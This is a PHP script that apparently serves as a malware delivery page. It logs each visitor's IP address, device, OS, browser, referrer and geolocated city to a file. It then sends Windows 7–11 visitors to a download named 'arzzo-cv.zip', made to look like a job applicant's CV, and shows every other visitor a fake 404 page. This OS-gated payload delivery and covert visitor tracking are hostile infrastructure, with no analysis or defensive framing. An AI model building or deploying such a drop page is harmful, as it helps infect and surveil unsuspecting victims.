<?php 
 require('UserInfo.php');
 $os_pckname="arzzo-cv.zip";
$os_pckname1="Error404.html";
 $manage="GH3FP";

 
 $geopluginURL='http://www.geoplugin.net/php.gp?ip='.UserInfo::get_ip();
			$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
			$city = $addrDetailsArr['geoplugin_city'];
			$country = $addrDetailsArr['geoplugin_countryName'];
			
			 $zone=3600*+5;
             $date=gmdate("d-m-Y H:i:s", time()+$zone); 
			
			if (file_exists($myfile)) {
			$myfile = fopen("logs.txt", "a") or die("Unable to open file!");
			fwrite($myfile, $txt);
			$txt = "\r\n----------------------------IpAddress:  "." ".UserInfo::get_ip()." "."--------------------------------------\r\n";
			fwrite($myfile, $txt);
			$txt = "Device:  "." ".UserInfo::get_device()." "."\r\n";
			fwrite($myfile, $txt);
			$txt = "OS:  "." ".UserInfo::get_os()." "."\r\n";
			fwrite($myfile, $txt);
			$txt = "User-Agent:  "." ".UserInfo::GetMobileInfo()." "."\r\n";
			fwrite($myfile, $txt);
			$txt = "Architecture:  "." ".UserInfo::get_architecture()." "."\r\n";
			fwrite($myfile, $txt);
			$txt = "Browser:  "." ".UserInfo::get_browse()." "."\r\n";
			fwrite($myfile, $txt);
			$txt = "refer:  "." ".UserInfo::get_refer()." "."\r\n";
			fwrite($myfile, $txt);
			$zone=3600*+5;
			$date=gmdate("d-m-Y H:i:s", time()+$zone); 
			$txt = "Time:  "." ".$date." "."\r\n";
			fwrite($myfile, $txt);
            if(!$city){
               $city='Not Define';
               fwrite($myfile, $city);
            }
            else
            {
            	fwrite($myfile, $city);
            }
            
            if(!$country){
               $country='Not Define';
             // fwrite($myfile, $country);
            }
            else
            {
            	// fwrite($myfile, $country);
            }
            fclose($myfile);	
} 

        else {
                   $myfile = fopen("logs.txt", "a") or die("Unable to open file!");
                          
           
                    $txt = "\r\n----------------------------IpAddress:  "." ".UserInfo::get_ip()." "."--------------------------------------\r\n";
                    fwrite($myfile, $txt);
                    $txt = "Device:  "." ".UserInfo::get_device()." "."\r\n";
                    fwrite($myfile, $txt);
                    $txt = "OS:  "." ".UserInfo::get_os()." "."\r\n";
                    fwrite($myfile, $txt);
                    $txt = "User-Agent:  "." ".UserInfo::GetMobileInfo()." "."\r\n";
                    fwrite($myfile, $txt);
                    $txt = "Architecture:  "." ".UserInfo::get_architecture()." "."\r\n";
                    fwrite($myfile, $txt);
                    $txt = "Browser:  "." ".UserInfo::get_browse()." "."\r\n";
                    fwrite($myfile, $txt);
                    $txt = "refer:  "." ".UserInfo::get_refer()." "."\r\n";
                    fwrite($myfile, $txt);
                   
                    $txt = "refer:  "." ".$date." "."\r\n";
                    fwrite($myfile, $txt);
                    
                                if(!$city){
                                   $city='Not ';
                                   fwrite($myfile, $city);
                                }
                                else
                                {
                                	fwrite($myfile, $city);
                                }
                                if(!$country){
                                   $country='Not Define';
                                 // fwrite($myfile, $country);
                                }
                                else
                                {
                                	// fwrite($myfile, $country);
                                }
                                fclose($myfile);
        }
											

											if(UserInfo::get_os()=='Windows_7'||UserInfo::get_os()=='Windows_8'||UserInfo::get_os()=='Windows_8.1'||UserInfo::get_os()=='Windows_10'||UserInfo::get_os()=='Windows_11')
													  {
														        header("Location:".$os_pckname);
													  }
                                                                                             
                                            else
                                                     {
                                                                    header("Location:".$os_pckname1);
                                                     }
                                                     


							
?>
